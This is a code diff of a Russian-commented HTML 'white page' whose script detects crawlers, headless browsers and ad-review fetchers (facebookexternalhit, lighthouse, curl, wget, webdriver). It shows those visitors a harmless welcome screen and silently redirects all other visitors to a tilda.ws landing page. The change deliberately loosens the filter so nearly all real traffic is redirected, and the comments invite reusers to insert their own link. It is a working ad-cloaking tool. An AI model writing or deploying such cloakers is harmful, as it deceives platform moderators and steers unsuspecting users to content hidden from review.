@@ -1,51 +1,35 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Проверка пользователя</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>White Page</title>
   <script>
-    const redirectUrl = "http://argentinaforreal.tilda.ws/"; // ⚠️ замени на свою ссылку
+    // ССЫЛКА НА ФИНАЛКУ
+    const redirectUrl = "http://argentinaforreal.tilda.ws/"; // замени на свою
 
-    const userAgent = navigator.userAgent;
+    const userAgent = navigator.userAgent.toLowerCase();
     const isWebdriver = navigator.webdriver === true;
-    const botPatterns = [
-      /bot/i, /crawl/i, /spider/i,
-      /headless/i, /python/i, /wget/i,
-      /curl/i, /lighthouse/i, /preview/i
-    ];
-    const matchedPattern = botPatterns.find(p => p.test(userAgent));
-    const isBotUA = !!matchedPattern;
 
-    // Лог в консоль
-    console.log("🧠 User-Agent:", userAgent);
-    console.log("🤖 Бот по user-agent:", isBotUA);
-    console.log("🛠 navigator.webdriver:", isWebdriver);
+    // Очень мягкий фильтр: только явные сканеры и headless
+    const softBotPatterns = [
+      /headless/i,
+      /lighthouse/i,
+      /preview/i,
+      /facebookexternalhit/i,
+      /curl/i,
+      /wget/i
+    ];
+    const isBotUA = softBotPatterns.some(p => p.test(userAgent));
 
     if (!isBotUA && !isWebdriver) {
-      console.log("✅ Пользователь одобрен, редирект...");
+      // Проходит почти весь реальный трафик
       window.location.href = redirectUrl;
     } else {
-      console.log("❌ Блокировка: бот или подозрительный агент.");
-
-      let reason = "";
-      if (isBotUA) {
-        reason += "🚫 Обнаружен подозрительный User-Agent: " + matchedPattern + "<br>";
-      }
-      if (isWebdriver) {
-        reason += "🕵️ Обнаружен webdriver: автоматизация<br>";
-      }
-
-      // Показываем пользователю на экране, что он бот (для тестов)
+      // Остаётся на white
       document.write(`
-        <div style="text-align:center; margin-top:60px; font-family:sans-serif;">
-          <h2>Вы остались на white page</h2>
-          <p><strong>Причина блокировки:</strong></p>
-          <p style="color:red">${reason}</p>
-          <hr>
-          <p style="font-size:12px;">User-Agent:</p>
-          <p style="font-size:12px;">${userAgent}</p>
-        </div>
+        <h1 style="text-align:center; margin-top: 60px;">Bienvenido</h1>
+        <p style="text-align:center; font-size:12px;">(Тестовый белый экран для подозрительного трафика)</p>
       `);
     }
   </script>
@@ -53,5 +37,3 @@
 <body>
 </body>
 </html>
-
-
